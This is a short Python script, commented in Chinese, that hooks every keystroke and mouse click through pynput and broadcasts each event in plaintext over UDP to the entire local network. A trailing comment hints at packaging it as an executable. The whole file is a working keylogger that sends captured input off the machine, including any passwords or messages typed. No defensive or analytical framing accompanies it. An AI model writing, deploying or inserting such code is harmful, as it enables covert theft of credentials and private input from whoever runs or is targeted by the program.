from pynput import keyboard, mouse
import socket
import threading

# 广播地址和端口
BROADCAST_IP = '255.255.255.255'  # 使用广播地址
PORT = 65432

# 创建UDP广播socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

# 键盘事件回调
def on_press(key):
    try:
        message = f'Key pressed: {key.char}'
    except AttributeError:
        message = f'Special key pressed: {key}'
    print(message)
    send_broadcast(message)

# 鼠标事件回调
def on_click(x, y, button, pressed):
    if pressed:
        message = f'Mouse clicked at ({x}, {y}) with {button}'
        print(message)
        send_broadcast(message)

# 发送广播消息
def send_broadcast(message):
    sock.sendto(message.encode(), (BROADCAST_IP, PORT))

# 启动键盘监听器
def start_keyboard_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# 启动鼠标监听器
def start_mouse_listener():
    with mouse.Listener(on_click=on_click) as listener:
        listener.join()

# 使用线程并行启动监听器
if __name__ == "__main__":
    threading.Thread(target=start_keyboard_listener).start()
    threading.Thread(target=start_mouse_listener).start()

# PYINSTALLER